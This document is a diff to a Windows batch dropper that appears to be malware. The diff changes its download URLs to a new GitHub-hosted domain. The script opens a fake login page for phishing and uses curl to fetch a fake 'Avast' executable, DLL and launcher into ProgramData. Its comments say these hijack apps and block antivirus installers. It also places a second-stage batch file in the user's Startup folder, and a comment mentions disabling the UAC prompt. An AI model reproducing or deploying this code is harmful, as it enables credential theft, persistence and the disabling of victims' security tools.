@@ -57,8 +57,8 @@ if '%errorlevel%' NEQ '0' (
 :: Opens fake login page
 :: ========================================================================
 
-start chrome.exe https://team-xz.github.io/login.html
-start https://team-xz.github.io/login.html
+start chrome.exe https://teamx-z.github.io/login.html
+start https://teamx-z.github.io/login.html
 
 :: ========================================================================
 :: Downloads fake avast
@@ -67,12 +67,12 @@ start https://team-xz.github.io/login.html
 cd C:\ProgramData
 mkdir pawast
 cd pawast
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.deps.json
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.dll
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.exe
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.pdb
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/launcher.exe
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.deps.json
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.dll
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.exe
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.pdb
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/launcher.exe
 
 :: ========================================================================
 :: Hijacking some apps with fake avast (also blocks av installers)
@@ -98,7 +98,7 @@ endlocal
 :: ========================================================================
 
 cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/stagetwo.bat
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stagetwo.bat
 
 :: ========================================================================
 :: Disabling UAC prompt (saved for last just in case AV detects)
